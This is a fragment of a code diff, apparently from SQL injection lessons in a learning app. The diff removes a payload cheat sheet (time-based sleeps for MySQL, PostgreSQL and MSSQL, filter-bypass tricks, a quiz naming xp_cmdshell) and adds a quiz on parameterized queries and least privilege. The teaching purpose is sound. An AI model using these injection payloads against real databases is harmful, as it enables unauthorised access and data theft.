-  ' AND LENGTH(database())=N--
-
-TIME-BASED:
-  MySQL:       ' AND SLEEP(5)--
-  PostgreSQL:  ' AND pg_sleep(5)--
-  MSSQL:       ' WAITFOR DELAY '0:0:5'--
-
-FILTER BYPASS:
-  Space:    'OR/**/1=1--
-  Hex:      0x61646D696E  ('admin')
-  Keyword:  UnIoN  SEL/**/ECT`,
-    questions: [
-      { q: "What MySQL variable shows the server version in a UNION query?", a: "@@version" },
-      { q: "What MySQL function concatenates multiple rows into one string?", a: "GROUP_CONCAT()" },
-      { q: "What Oracle function is used for time-based blind SQLi?", a: "DBMS_PIPE.RECEIVE_MESSAGE()" },
-      { q: "What MSSQL stacked query command executes system commands?", a: "EXEC xp_cmdshell 'command'" },
-      { q: "What hex encoding represents 'admin' in MySQL?", a: "0x61646D696E" }
+      { q: "What is the absolute best defense in the world against SQL Injection?", a: "Parameterized Queries (Prepared Statements)" },
+      { q: "How does the unbreakable cage work? (It separates the rules from the...)", a: "data (or user input)" },
+      { q: "If the robot uses the cage, will it obey the hacker's tricky math commands? (yes/no)", a: "no" },
+      { q: "What rule says you should only give the robot the exact keys it needs and nothing more?", a: "Principle of Least Privilege" },
+      { q: "Should the public website robot ever be given the power to delete the database? (yes/no)", a: "no" }
     ]
   }
 ];
